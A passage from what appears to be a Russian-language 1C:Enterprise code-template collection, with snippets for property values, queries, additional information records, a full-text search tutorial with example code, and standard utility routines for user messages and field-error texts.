			Если КодЗначенияСвойстваЗаполнен Тогда // Значит ожидаем одно значение согласно коду
				Прервать; 	
			КонецЕсли; 
		КонецЦикла;
	КонецЕсли;

	ЗначениеСвойстваКоличество = ЗначениеСвойства.Количество();
	Если ЗначениеСвойстваКоличество > 0 Тогда
		Если ЗначениеСвойстваКоличество > 1 Тогда
			Возврат ЗначениеСвойства;
		Иначе
			Возврат ЗначениеСвойства[0];
		КонецЕсли;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
	
	Возврат ЗначениеСвойства; // На всякий случай
	
КонецФункции // ПолучитьЗначениеЗначениеСвойства()
  
ЗначенияСвойства 		= ПолучитьЗначениеСвойства(КодСвойстваОбъекта);
ТипЗнчЗначенийСвойств 	= ТипЗнч(ЗначенияСвойства);
Если ТипЗнчЗначенийСвойств = Тип(""Массив"") Тогда
	Сообщить(""Массив"");	
ИначеЕсли ТипЗнчЗначенийСвойств = Тип(""СправочникСсылка.ЗначенияСвойствОбъектов"") Тогда
	Сообщить(""ЗначенияСвойствОбъектов"");
КонецЕсли;"}
},
{0,
{"ПолучитьТекстЗапроса",0,0,"ПТЗ","Запрос = Новый Запрос;
Запрос.Текст = <?""Префикс теста запроса (слитно, можно пустой)"">ПолучитьТекстЗапроса();

Запрос.УстановитьПараметр("""", );

РезультатЗапроса = Запрос.Выполнить();

Если НЕ РезультатЗапроса.Пустой() Тогда
	ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
	Пока ВыборкаДетальныеЗаписи.Следующий() Цикл
		// Вставить обработку выборки ВыборкаДетальныеЗаписи
		ВДЗ_ = ВыборкаДетальныеЗаписи.;
		Прервать;
	КонецЦикла;
Иначе
КонецЕсли;

Функция <?""Префикс теста запроса (слитно, можно пустой)"">ПолучитьТекстЗапроса()
	
	ТекстЗапроса = """";
	
	Возврат ТекстЗапроса;
	
КонецФункции
"}
},
{0,
{"Доп свойство (в реквизит)",0,0,"","лИмяДопСвойство 			= ""Статус сделки Битрикс24 (Счета покупателям)"";
лДопСвойствоСтатусСледки 	= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(лИмяДопСвойство);
лЗначенияСтатусСледки 		= Справочники.ЗначенияСвойствОбъектов.НайтиПоНаименованию(""Закупка товара (услуг)"",,, лДопСвойствоСтатусСледки); 

ТаблицаПредСвойств = Новый ТаблицаЗначений;
ТаблицаПредСвойств.Колонки.Добавить(""Свойство"");
ТаблицаПредСвойств.Колонки.Добавить(""ЗначениеСвойства"");

НовСтрока = ТаблицаПредСвойств.Добавить();
НовСтрока.Свойство 			= лДопСвойствоСтатусСледки; 
НовСтрока.ЗначениеСвойства 	= лЗначенияСтатусСледки;

НаборЗаписей = РегистрыСведений.ДополнительныеСведения.СоздатьНаборЗаписей();
НаборЗаписей.Отбор.Объект.Установить(лСчетНаОплатуПокупателю);
НаборЗаписей.Прочитать();

Для Каждого ТекСвойство из ТаблицаПредСвойств Цикл
	
	ЕстьСвойство = Ложь;
	
	Для Каждого ТекСтрока из НаборЗаписей Цикл
		Если ТекСтрока.Свойство = ТекСвойство.Свойство тогда
			ЕстьСвойство = Истина;
			ТекСтрока.Значение = ТекСвойство.ЗначениеСвойства;	
		КонецЕсли;
	КонецЦикла;
	
	Если ЕстьСвойство = Ложь тогда
		НоваяЗапись = НаборЗаписей.Добавить();
		НоваяЗапись.Объект = лСчетНаОплатуПокупателю;
		НоваяЗапись.Свойство = ТекСвойство.Свойство;
		НоваяЗапись.Значение = ТекСвойство.ЗначениеСвойства;
	КонецЕсли;
КонецЦикла;"}
}
}
},
{2,
{"Полнотекстовый поиск",1,0,"",""},
{0,
{"Полнотекстовый поиск",0,0,"","Полнотекстовый поиск в 1С (что это и пример использования)
https://helpf.pro/faq/view/1741.html

Полнотекстовый поиск -  позволит найти текстовую информацию, размещенную практически в любом месте используемой конфигурации. При этом искать нужные данные можно либо по всей конфигурации в целом, либо сузив область поиска до нескольких объектов (например, определенных видов документов или справочников). Сами критерии поиска могут варьироваться в довольно широком диапазоне. То есть найти нужные данные можно, даже не помня точно, где они хранятся в конфигурации и как именно записаны.

Полнотекстовый поиск предоставляет следующие возможности:

Есть поддержка транслитерации (написание русских слов символами латиницы в соответствии с ГОСТ 7.79-2000). Пример: ""русская фраза"" = ""russkaya fraza"".
Есть поддержка замещения (написание части символов в русских словах одноклавишными латинскими символами). Пример: ""руссrfz фраpf"" (окончания каждого слова набраны латиницей, допустим, в результате ошибки оператора).
Есть возможность нечеткого поиска (буквы в найденных словах могут отличаться) с указанием порога нечеткости. Пример: указав в строке поиска слово ""привет"" и нечеткость 17 %, найдем все аналогичные слова с ошибками и без: ""привет"", ""превет"", ""привед"".
Есть возможность указать область выполнения поиска по выбранным объектам метаданных.
Полнотекстовое индексирование названий стандартных полей (""Код"", ""Наименование"" и т. д.) производится на всех языках конфигурации.
Поиск выполняется с учетом синонимов русского, английского и украинского языков.
Морфологический словарь русского языка содержит ряд специфических слов, относящихся к областям деятельности, автоматизируемым с помощью системы программ ""1С:Предприятие"".
Стандартно в состав поставляемых словарей включены словарные базы и словари тезауруса и синонимов русского, украинского и английского языков, которые предоставлены компанией ""Информатик"".
Поиск можно осуществлять с использованием подстановочных символов (""*""), а также с указанием поисковых операторов (""И"", ""ИЛИ"", ""НЕ"", ""РЯДОМ"") и спецсимволов.
Полнотекстовый поиск можно осуществлять в любой конфигурации на платформе 1С:Предприятие 8

Для того чтобы открыть окно управления полнотекстовым поиском необходимо выполнить следующее: 

Обычное приложение - пункт меню Операции - Управление полнотекстовым поиском.



Управляемое приложение - пункт меню Главное меню - Все функции - Стандартные - Управление полнотекстовым поиском.



Обновить индекс – Создание индекса/Обновление индекса; 
Очистить индекс – обнуление индекса(рекомендуется после обновления всех данных); 
пункт Разрешить слияние индексов – отвечает за слияние основного и дополнительного индекса.
Полнотекстовый поиск осуществляется при помощи полнотекстового индекса. При отсутствии индекса полнотекстовый поиск как таковой не возможен. Для того чтобы поиск имел результат, все необходимые данные должны быть включены в полнотекстовый индекс. Если пользователем введены в базу новые данные, их следует включить в рассматриваемый индекс, иначе они не будут участвовать в поиске. Чтобы этого избежать, необходимо обновлять полнотекстовый индекс. При обновлении система анализирует только определенные типы данных: Строка, Данные ссылочного типа (ссылки на документы, справочники),Число, Дата, ХранилищеЗначения. Если пользователь не имеет прав доступа к определенной информации, то он не сможет увидеть ее в результатах поиска. Следует также помнить и о том, что в свойствах объектов, по которым будет происходить поиск должно быть установлено значение Полнотекстовый Поиск – Использовать, которое задано по умолчанию.

Как вы можете заметить свойство Использовать установлено для всего справочника Контрагенты, но сделать это можно и для каждого его реквизита соответствующего типа.

Рассмотрим более подробно полнотекстовый индекс, который состоит из двух частей (индексов): основного индекса и дополнительного. Высокая скорость поиска данных обеспечивается за счет основного индекса, но обновление его происходит относительно медленно, в зависимости от объема данных. Дополнительный индекс ему противоположен. Данные добавляются в него намного быстрее, но поиск осуществляется медленнее. Система осуществляет поиск одновременно в обоих индексах. Большая часть данных находится в основном индексе, а данные добавляемые в систему попадают в дополнительный индекс. Пока объем данных в дополнительном индексе небольшой, поиск по нему происходит относительно быстро. В тот момент, когда нагрузка на систему невелика, происходит операция слияния индексов, в результате чего дополнительный индекс очищается, а все данные помещаются в основной индекс. Слияние индексов предпочтительнее выполнять в тот момент времени, когда нагрузка на систему минимальна. С этой целью можно создавать регламентированные задания и задания по расписанию.

Специальные операторы, допустимые при задании поискового выражения
Механизм полнотекстового поиска допускает написание части символов русского слова одноклавишными латинскими символами. Результат поиска при этом не измениться.



Два оператора РЯДОМ

упрощенный. На расстоянии 8 слов друг от друга
РЯДОМ/[+/-]n – поиск данных в одном реквизите на расстоянии n-1 слов между ними.
Знак указывает в каком направлении от первого слова будет поиск второго. (+ - после, - до)

Групповой символ «*» может использоваться только в качестве замены конца слова

Оператор нечеткости «#». Если неизвестно точное написание названия, имени.

Программными средствами и средствами 1с: программирование.

Оператор синонимов «!». Позволяет найти слово и его синонимы

Как программно обновить индекс полнотекстового поиска?
Код 1C v 8.х
 Процедура ОбновлениеИндексы() Экспорт
ПолнотекстовыйПоиск.ОбновитьИндекс();
КонецПроцедуры   
Пример полнотекстового поиска данных
Определение переменной СписокПоиска

Код 1C v 8.х
 Перем СписокПоиска;   
Кроме этого в процедуре обработки события ПриОткрыии формы определим, что эта переменная будет содержать список полнотекстового поиска, с помощью которого мы и будем осуществлять поиск в данных

Код 1C v 8.х
 Процедура ПриОткрытии()
СписокПоиска = ПолнотекстовыйПоиск.СоздатьСписок();
КонецПроцедуры   
Теперь для события нажатия на кнопку Найти напишем код, который позволит нам выполнять поиск в соответствии с тем выражением, которое задано в поле ПоисковоеВыражение

Код 1C v 8.х
 Процедура НайтиНажатие(Элемент)
СписокПоиска.СтрокаПоиска = ПоисковоеВыражение;
Попытка
СписокПоиска.ПерваяЧасть();
Исключение
Предупреждение(ОписаниеОшибки());
КонецПопытки;
Если СписокПоиска.ПолноеКоличество() = 0 Тогда
ЭлементыФормы.СообщениеОРезультате.Значение = ""Не найдено"";
ЭлементыФормы.РезультатПоиска.УстановитьТекст("""");
Иначе
ВывестиРезультатПоиска();
КонецЕсли;
КонецПроцедуры   
Сначала в этой процедуре мы устанавливаем поисковое выражение, введенное пользователем, в качестве строки поиска для полнотекстового поиска. Затем выполняем метод ПерваяЧасть(), который собственно запускает полнотекстовый поиск и возвращает первую порцию результатов. По умолчанию порция содержит 20 элементов. После этого мы анализируем количество элементов в списке поиска. Если он не содержит ни одного элемента, то мы выводим в форму соответствующее сообщение. В противном случае вызывается процедура ВывестиРезультатПоиска(), которая отображает полученные результаты пользователю.

Создадим в модуле формы процедуру с таким именем и напишем в ней код,

Код 1C v 8.х
 Процедура ВывестиРезультатПоиска()
ЭлементыФормы.СообщениеОРезультате.Значение = ""Показаны "" + Строка(СписокПоиска.НачальнаяПозиция() + 1) + "" - "" + Строка(СписокПоиска.НачальнаяПозиция() +СписокПоиска.Количество()) + "" из "" + СписокПоиска.ПолноеКоличество();
Результат = СписокПоиска.ПолучитьОтображение(ВидОтображенияПолнотекстовогоПоиска.HTMLТекст);
ЭлементыФормы.РезультатПоиска.УстановитьТекст(Результат);
ДоступностьКнопок();
КонецПроцедуры   
Действия, выполняемые в этой процедуре, просты. Сначала мы формируем сообщение о том, какие элементы отображены и сколько всего элементов найдено. Затем получаем результат полнотекстового поиска в виде HTML-текста и выводим этот текст в поле HTML-документа, расположенное в форме.

В заключение передаем управление в процедуру ДоступностьКнопок() для того, чтобы сделать доступными или, наоборот, запретить доступ к кнопкам Предыдущая порция и Следующая порция (в зависимости от того, какая порция полученных результатов отображена). Текст этой процедуры представлен в Коде

Код 1C v 8.х
 Процедура ДоступностьКнопок()
ЭлементыФормы.СледующаяПорция.Доступность = (СписокПоиска.ПолноеКоличество() - СписокПоиска.НачальнаяПозиция()) > СписокПоиска.Количество();
ЭлементыФормы.ПредыдущаяПорция.Доступность = (СписокПоиска.НачальнаяПозиция() > 0);
КонецПроцедуры   
Теперь необходимо создать обработчики событий нажатия на кнопки ПредыдущаяПорция() и СледующаяПорция().

Код 1C v 8.х
 Процедура ПредыдущаяПорцияНажатие(Элемент)
СписокПоиска.ПредыдущаяЧасть();
ВывестиРезультатПоиска();
КонецПроцедуры
Процедура СледующаяПорцияНажатие(Элемент)
СписокПоиска.СледующаяЧасть();
ВывестиРезультатПоиска();
КонецПроцедуры   
Заключительным «штрихом» будет создание обработчика события onclick поля HTML-документа, расположенного в форме. Дело в том, что результат полнотекстового поиска, представленный в виде HTML-текста, содержит гиперссылки на номера элементов списка поиска. И нам хотелось бы, чтобы при переходе пользователя на эту ссылку система открывала бы форму того объекта, который содержится в этом элементе списка. Для этого мы будем перехватывать событие onclick HTML-документа, содержащегося в поле HTML-документа, получать номер элемента списка из гиперссылки и открывать форму соответствующего объекта. Текст обработчика события onclick поля HTML-документа представлен в коде

Код 1C v 8.х
 Процедура РезультатПоискаonclick(Элемент, pEvtObj)
htmlElement = pEvtObj.srcElement;
// Проверить идентификатор элемента
Если (htmlElement.id = ""FullTextSearchListItem"") Тогда
// Получить имя файла (номер строки списка поиска),
// содержащегося в гиперссылке
НомерВСписке = Число(htmlElement.nameProp);
// Получить строку списка поиска по номеру
ВыбраннаяСтрока = СписокПоиска[НомерВСписке];
// Открыть форму найденного объекта
ОткрытьЗначение(ВыбраннаяСтрока.Значение);
pEvtObj.returnValue = Ложь;
КонецЕсли;
КонецПроцедуры "}
},
{1,
{"Типовой в УНФ",1,0,"",""},
{0,
{"ПолнотекстовыйПоискНаСервереБезКонтекста",0,0,"","&НаКлиенте
// Функция добавляет в строку ПП поиска служебные символы в зависимости от включенных опций
//
Функция СформироватьУниверсальнуюСтрокуПоиска(ТекстПоиска)
	
	Возврат ?(Элементы.ФормаПолнотекстовыйПоискОпечатки.Пометка, ""#"", """") + ТекстПоиска + ?(Элементы.ФормаПолнотекстовыйПоискЛюбыеОкончания.Пометка, ""*"", """");
	
КонецФункции // СформироватьУниверсальнуюСтрокуПоиска()

&НаКлиенте
// Процедура устанавливает отбор по ссылкам полученными полнотекстовым поиском
//
Процедура ПолнотекстовыйПоискНаКлиенте(РезультатПоиска)
	
	Если ПустаяСтрока(ТекстПоиска) Тогда
		
		Возврат;
		
	КонецЕсли;
	
	УниверсальнаяCтрокаПоиска = СформироватьУниверсальнуюСтрокуПоиска(ТекстПоиска);
	ОписаниеОшибки = ПолнотекстовыйПоискНаСервереБезКонтекста(УниверсальнаяCтрокаПоиска, РезультатПоиска);
	
	Если НЕ ПустаяСтрока(ОписаниеОшибки) Тогда
		
		РезультатПоиска = Неопределено;
		ПоказатьПредупреждение(Неопределено, ОписаниеОшибки, 5, ""Поиск..."");
		
	КонецЕсли;
	
КонецПроцедуры // ПолнотекстовыйПоискНаКлиенте()

&НаСервереБезКонтекста
// Функция заполняет массив ссылок результата поиска или возвращает описание ошибки
//
//
Функция ПолнотекстовыйПоискНаСервереБезКонтекста(СтрокаПоиска, РезультатПоиска)
	
	ОписаниеОшибки = """";
	РезультатПоиска = ПодборНоменклатурыВДокументахПереопределяемый.ПоискТоваров(СтрокаПоиска, ОписаниеОшибки);
	
	Возврат ОписаниеОшибки;
	
КонецФункции // ПолнотекстовыйПоискНаСервереБезКонтекста()

// Полнотекстовый поиск

Функция ПоискТоваров(СтрокаПоиска, ОписаниеОшибки) Экспорт
	
	РезультатПоиска = Новый Структура;
	РезультатПоиска.Вставить(""Номенклатура"", Новый Массив);
	РезультатПоиска.Вставить(""ХарактеристикиНоменклатуры"", Новый Массив);
	
	Результат = ПолнотекстовыйПоискТоваров(СтрокаПоиска, РезультатПоиска);
	
	Если Результат = ""ВыполненоУспешно"" Тогда
		
		Возврат РезультатПоиска;
		
	ИначеЕсли Результат = ""СлишкомМногоРезультатов"" Тогда
		
		ОписаниеОшибки = НСтр(""ru = 'Слишком много результатов. Уточните запрос.'"");
		Возврат РезультатПоиска;
		
	ИначеЕсли Результат = ""НичегоНеНайдено"" Тогда
		
		ОписаниеОшибки = НСтр(""ru = 'Ничего не найдено'"");
		Возврат РезультатПоиска;
		
	Иначе
		
		ВызватьИсключение НСтр(""ru = 'Неизвестная ошибка'"");
		
	КонецЕсли;
	
КонецФункции

Функция ПолнотекстовыйПоискТоваров(СтрокаПоиска, РезультатПоиска)
	
	МассивШтрихкодов = Новый Массив;
	
	// Поиск данных
	РазмерПорции = 200;
	ОбластьПоиска = Новый Массив;
	ОбластьПоиска.Добавить(Метаданные.Справочники.Номенклатура);
	ОбластьПоиска.Добавить(Метаданные.Справочники.ХарактеристикиНоменклатуры);
	ОбластьПоиска.Добавить(Метаданные.РегистрыСведений.ДополнительныеСведения);
	ОбластьПоиска.Добавить(Метаданные.РегистрыСведений.ШтрихкодыНоменклатуры);
	
	СписокПоиска = ПолнотекстовыйПоиск.СоздатьСписок(СтрокаПоиска, РазмерПорции);
	СписокПоиска.ПолучатьОписание = Ложь;
	СписокПоиска.ОбластьПоиска = ОбластьПоиска;
	СписокПоиска.ПерваяЧасть();
	
	Если СписокПоиска.СлишкомМногоРезультатов() Тогда
		
		Возврат ""СлишкомМногоРезультатов"";
		
	КонецЕсли;
	
	Если СписокПоиска.ПолноеКоличество() = 0 Тогда
		
		Возврат ""НичегоНеНайдено"";
		
	КонецЕсли;
	
	Пока Истина Цикл
		
		Для Каждого Элемент Из СписокПоиска Цикл
			
			Если Элемент.Метаданные = Метаданные.Справочники.Номенклатура Тогда
				
				РезультатПоиска.Номенклатура.Добавить(Элемент.Значение);
				
			ИначеЕсли Элемент.Метаданные = Метаданные.Справочники.ХарактеристикиНоменклатуры Тогда
				
				РезультатПоиска.ХарактеристикиНоменклатуры.Добавить(Элемент.Значение);
				
			ИначеЕсли Элемент.Метаданные = Метаданные.РегистрыСведений.ДополнительныеСведения Тогда
				
				Если ТипЗнч(Элемент.Значение.Объект) = Тип(""СправочникСсылка.Номенклатура"") Тогда
					
					РезультатПоиска.Номенклатура.Добавить(Элемент.Значение.Объект);
					
				КонецЕсли;
				
			ИначеЕсли Элемент.Метаданные = Метаданные.РегистрыСведений.ШтрихкодыНоменклатуры Тогда
				
				МассивШтрихкодов.Добавить(Элемент.Значение.Штрихкод);
				
			Иначе
				
				ВызватьИсключение НСтр(""ru = 'Неизвестная ошибка'"");
				
			КонецЕсли;
			
		КонецЦикла;
		
		Попытка
			
			// Работать с общим размером выборки нельзя, так как он динамичен:
			// - пока мы обрабатываем результат может пройти операция обновления индекса
			//   поэтому работаем до первого исключения, после выходим с полученными данными.
			СписокПоиска.СледующаяЧасть();
			
		Исключение
			
			Прервать;
			
		КонецПопытки;
		
	КонецЦикла;
	
	Если МассивШтрихкодов.Количество() > 0 Тогда
		
		Запрос = Новый Запрос;
		Запрос.Текст = 
		""ВЫБРАТЬ
		|	ШтрихкодыНоменклатуры.Номенклатура КАК Номенклатура,
		|	ШтрихкодыНоменклатуры.Характеристика КАК Характеристика
		|ИЗ
		|	РегистрСведений.ШтрихкодыНоменклатуры КАК ШтрихкодыНоменклатуры
		|ГДЕ
		|	ШтрихкодыНоменклатуры.Штрихкод В(&МассивШтрихкодов)
		|	И ШтрихкодыНоменклатуры.Номенклатура ССЫЛКА Справочник.Номенклатура"";
		
		Запрос.УстановитьПараметр(""МассивШтрихкодов"", МассивШтрихкодов);
		
		Выборка = Запрос.Выполнить().Выбрать();
		Пока Выборка.Следующий() Цикл
			
			РезультатПоиска.Номенклатура.Добавить(Выборка.Номенклатура);
			
		КонецЦикла;
		
	КонецЕсли;
	
	Возврат ""ВыполненоУспешно"";
	
КонецФункции

// Конец Полнотекстовый поиск

"}
}
}
},
{1,
{"ОбщегоНазначенияКлиентСервер  (популярные типовые ништяки)",1,0,"",""},
{0,
{"ОбщегоНазначенияКлиентСервер ЗУП Типовое",0,0,"","////////////////////////////////////////////////////////////////////////////////
// Клиентские и серверные процедуры и функции общего назначения:
// - для поддержки формирования печатных форм;
// - для работы с файлами;
// - для работы с управляемыми формами; 
// - для работы с почтовыми адресами;
// - для работы с отборами динамических списков;
// - прочее.
// ОбщегоНазначенияКлиентСервер
////////////////////////////////////////////////////////////////////////////////

#Область ПрограммныйИнтерфейс

// Формирует и выводит сообщение, которое может быть связано с элементом 
// управления формы.
//
// Параметры:
//  ТекстСообщенияПользователю - Строка - текст сообщения.
//  КлючДанных                 - ЛюбаяСсылка - объект или ключ записи информационной базы, к которому это сообщение относится.
//  Поле                       - Строка - наименование реквизита формы.
//  ПутьКДанным                - Строка - путь к данным (путь к реквизиту формы).
//  Отказ                      - Булево - выходной параметр, всегда устанавливается в значение Истина.
//
// Пример:
//
//  1. Для вывода сообщения у поля управляемой формы, связанного с реквизитом объекта:
//  ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
//   НСтр(""ru = 'Сообщение об ошибке.'""), ,
//   ""ПолеВРеквизитеФормыОбъект"",
//   ""Объект"");
//
//  Альтернативный вариант использования в форме объекта:
//  ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
//   НСтр(""ru = 'Сообщение об ошибке.'""), ,
//   ""Объект.ПолеВРеквизитеФормыОбъект"");
//
//  2. Для вывода сообщения рядом с полем управляемой формы, связанным с реквизитом формы:
//  ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
//   НСтр(""ru = 'Сообщение об ошибке.'""), ,
//   ""ИмяРеквизитаФормы"");
//
//  3. Для вывода сообщения связанного с объектом информационной базы:
//  ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
//   НСтр(""ru = 'Сообщение об ошибке.'""), ОбъектИнформационнойБазы, ""Ответственный"",,Отказ);
//
//  4. Для вывода сообщения по ссылке на объект информационной базы:
//  ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
//   НСтр(""ru = 'Сообщение об ошибке.'""), Ссылка, , , Отказ);
//
//  Случаи некорректного использования:
//   1. Передача одновременно параметров КлючДанных и ПутьКДанным.
//   2. Передача в параметре КлючДанных значения типа отличного от допустимых.
//   3. Установка ссылки без установки поля (и/или пути к данным).
//
Процедура СообщитьПользователю(
		Знач ТекстСообщенияПользователю,
		Знач КлючДанных = Неопределено,
		Знач Поле = """",
		Знач ПутьКДанным = """",
		Отказ = Ложь) Экспорт
	
	Сообщение = Новый СообщениеПользователю;
	Сообщение.Текст = ТекстСообщенияПользователю;
	Сообщение.Поле = Поле;
	
	ЭтоОбъект = Ложь;
	
#Если НЕ ТонкийКлиент И НЕ ВебКлиент И НЕ МобильныйКлиент Тогда
	Если КлючДанных <> Неопределено
	   И XMLТипЗнч(КлючДанных) <> Неопределено Тогда
		ТипЗначенияСтрокой = XMLТипЗнч(КлючДанных).ИмяТипа;
		ЭтоОбъект = СтрНайти(ТипЗначенияСтрокой, ""Object."") > 0;
	КонецЕсли;
#КонецЕсли
	
	Если ЭтоОбъект Тогда
		Сообщение.УстановитьДанные(КлючДанных);
	Иначе
		Сообщение.КлючДанных = КлючДанных;
	КонецЕсли;
	
	Если НЕ ПустаяСтрока(ПутьКДанным) Тогда
		Сообщение.ПутьКДанным = ПутьКДанным;
	КонецЕсли;
		
	Сообщение.Сообщить();
	
	Отказ = Истина;
	
КонецПроцедуры

// Добавляет в список ошибок новую ошибку пользователя для дальнейшей отправки с помощью
// процедуры СообщитьОшибкиПользователю().
// Предназначена для накопления списка ошибок с последующей обработкой этого списка перед тем, как вывести
// пользователю. Полученный список ошибок можно, например, отсортировать по важности, очистить от дублей,
// а также вывести пользователю в ином виде, чем выводит метод СообщитьПользователю, например, в табличный документ.
//
// Параметры:
//  Ошибки          - Неопределено - будет создан новый список,
//                  - значение, установленное при первом вызове этой процедуры со значением Неопределено.
//
//  ПолеОшибки      - Строка - значение, которое задается в свойстве Поле объекта СообщениеПользователю.
//                    Для автоподстановки номера строки должна содержать ""%1"".
//                    Например, ""Объект.ИНН"" или ""Объект.Пользователи[%1].Пользователь"".
//
//  ТекстДляОднойОшибки - Строка - текст ошибки для случая, когда ГруппаОшибок в коллекции только одна,
//                    например, НСтр(""ru = 'Пользователь не выбран.'"").
//
//  ГруппаОшибок    - Произвольный - используется для выбора либо текста для одной ошибки,
//                    либо текста для нескольких ошибок, например, имя ""Объект.Пользователи"".
//                    Если значение не заполнено, тогда используется текст для одной ошибки.
//
//  НомерСтроки     - Число - значение от 0 ... , определяющее номер строки, который нужно подставить
//                    в строку ПолеОшибки и в ТекстДляНесколькихОшибок (подставляется НомерСтроки + 1).
//
//  ТекстДляНесколькихОшибок - Строка - текст ошибки для случая, когда добавлено несколько ошибок с одинаковым
//                    свойством ГруппаОшибок, например, НСтр(""ru = 'Пользователь в строке %1 не выбран.'"").
//
//  ИндексСтроки    - Неопределено - совпадает со значением параметра НомерСтроки.
//                    Число - значение от 0 ... , определяющее номер строки, который нужно подставить
//                    в строку ПолеОшибки.
//
Процедура ДобавитьОшибкуПользователю(Ошибки, ПолеОшибки, ТекстДляОднойОшибки, ГруппаОшибок, НомерСтроки = 0, ТекстДляНесколькихОшибок = """", ИндексСтроки = Неопределено) Экспорт
	
	Если Ошибки = Неопределено Тогда
		Ошибки = Новый Структура;
		Ошибки.Вставить(""СписокОшибок"", Новый Массив);
		Ошибки.Вставить(""ГруппыОшибок"", Новый Соответствие);
	КонецЕсли;
	
	Если НЕ ЗначениеЗаполнено(ГруппаОшибок) Тогда
		// При незаполненной группе ошибок используется текст для одной ошибки.
	Иначе
		Если Ошибки.ГруппыОшибок[ГруппаОшибок] = Неопределено Тогда
			// Группа ошибок использовалась один раз, используется текст для одной ошибки.
			Ошибки.ГруппыОшибок.Вставить(ГруппаОшибок, Ложь);
		Иначе
			// Группа ошибок использовалась несколько раз, используется текст для нескольких ошибок.
			Ошибки.ГруппыОшибок.Вставить(ГруппаОшибок, Истина);
		КонецЕсли;
	КонецЕсли;
	
	Ошибка = Новый Структура;
	Ошибка.Вставить(""ПолеОшибки"",               ПолеОшибки);
	Ошибка.Вставить(""ТекстДляОднойОшибки"",      ТекстДляОднойОшибки);
	Ошибка.Вставить(""ГруппаОшибок"",             ГруппаОшибок);
	Ошибка.Вставить(""НомерСтроки"",              НомерСтроки);
	Ошибка.Вставить(""ТекстДляНесколькихОшибок"", ТекстДляНесколькихОшибок);
	Ошибка.Вставить(""ИндексСтроки"",             ИндексСтроки);
	
	Ошибки.СписокОшибок.Добавить(Ошибка);
	
КонецПроцедуры

// Выводит накопленные методом ДобавитьОшибкуПользователю ошибки, при этом использует нужные шаблоны текстов ошибок
// в зависимости от количества однотипных ошибок.
//
// Параметры:
//  Ошибки  - Неопределено, Структура - коллекция ошибок.
//  Отказ   - Булево - устанавливается Истина, если ошибки сообщались.
//
Процедура СообщитьОшибкиПользователю(Ошибки, Отказ = Ложь) Экспорт
	
	Если Ошибки = Неопределено Тогда
		Возврат;
	Иначе
		Отказ = Истина;
	КонецЕсли;
	
	Для каждого Ошибка Из Ошибки.СписокОшибок Цикл
		
		Если Ошибка.ИндексСтроки = Неопределено Тогда
			ИндексСтроки = Ошибка.НомерСтроки;
		Иначе
			ИндексСтроки = Ошибка.ИндексСтроки;
		КонецЕсли;
		
		Если Ошибки.ГруппыОшибок[Ошибка.ГруппаОшибок] <> Истина Тогда
			
			СообщитьПользователю(
				Ошибка.ТекстДляОднойОшибки,
				,
				СтрЗаменить(Ошибка.ПолеОшибки, ""%1"", Формат(ИндексСтроки, ""ЧН=0; ЧГ="")));
		Иначе
			СообщитьПользователю(
				СтрЗаменить(Ошибка.ТекстДляНесколькихОшибок, ""%1"", Формат(Ошибка.НомерСтроки + 1, ""ЧН=0; ЧГ="")),
				,
				СтрЗаменить(Ошибка.ПолеОшибки, ""%1"", Формат(ИндексСтроки, ""ЧН=0; ЧГ="")));
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

// Формирует текст ошибок заполнения полей и списков.
//
// Параметры:
//  ВидПоля       - Строка - может принимать значения:
//                  Поле, Колонка, Список;
//  ВидСообщения  - Строка - может принимать значения:
//                  Заполнение, Корректность;
//  ИмяПоля        - Строка - имя поля;
//  НомерСтроки    - Строка, Число - номер строки;
//  ИмяСписка      - Строка - имя списка;
//  ТекстСообщения - Строка - детальная расшифровка ошибки заполнения.
//
// Возвращаемое значение:
//   Строка - текст ошибки заполнения.
//
Функция ТекстОшибкиЗаполнения(ВидПоля = ""Поле"", ВидСообщения = ""Заполнение"",
	ИмяПоля = """", НомерСтроки = """", ИмяСписка = """", ТекстСообщения = """") Экспорт

	Если ВРег(ВидПоля) = ""ПОЛЕ"" Тогда
		Если ВРег(ВидСообщения) = ""ЗАПОЛНЕНИЕ"" Тогда
			Шаблон = НСтр(""ru = 'Поле """"%1"""" не заполнено'"");
		ИначеЕсли ВРег(ВидСообщения) = ""КОРРЕКТНОСТЬ"" Тогда
			Шаблон = НСтр(""ru = 'Поле """"%1"""" заполнено некорректно.
								|%4'"");
		КонецЕсли;
	ИначеЕсли ВРег(ВидПоля) = ""КОЛОНКА"" Тогда
		Если ВРег(ВидСообщения) = ""ЗАПОЛНЕНИЕ"" Тогда
			Шаблон = НСтр(""ru = 'Не заполнена колонка """"%1"""" в строке %2 списка """"%3""""'"");
		ИначеЕсли ВРег(ВидСообщения) = ""КОРРЕКТНОСТЬ"" Тогда
			Шаблон = НСтр(""ru = 'Некорректно заполнена колонка """"%1"""" в строке %2 списка """"%3"""".
								|%4'"");
		КонецЕсли;
	ИначеЕсли ВРег(ВидПоля) = ""СПИСОК"" Тогда
		Если ВРег(ВидСообщения) = ""ЗАПОЛНЕНИЕ"" Тогда
			Шаблон = НСтр(""ru = 'Не введено ни одной строки в список """"%3""""'"");
		ИначеЕсли ВРег(ВидСообщения) = ""КОРРЕКТНОСТЬ"" Тогда
			Шаблон = НСтр(""ru = 'Некорректно заполнен список """"%3"""".
								|%4'"");
		КонецЕсли;
	КонецЕсли;

	Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(Шаблон, ИмяПоля, НомерСтроки, ИмяСписка, ТекстСообщения);

КонецФункции

// Формирует путь к заданной строке НомерСтроки и колонке ИмяРеквизита 
// табличной части ИмяТабличнойЧасти для выдачи сообщений в форме.
// Для совместного использования с процедурой СообщитьПользователю
// (для передачи в параметры Поле или ПутьКДанным). 
//
// Параметры:
//  ИмяТабличнойЧасти - Строка - имя табличной части.
//  НомерСтроки       - Число - номер строки табличной части.
//  ИмяРеквизита      - Строка - имя реквизита.
//
// Возвращаемое значение:
//  Строка - путь к ячейке таблицы.
//
Функция ПутьКТабличнойЧасти(Знач ИмяТабличнойЧасти, Знач НомерСтроки, 
	Знач ИмяРеквизита) Экспорт

	Возврат ИмяТабличнойЧасти + ""["" + Формат(НомерСтроки - 1, ""ЧН=0; ЧГ=0"") + ""]."" + ИмяРеквизита;

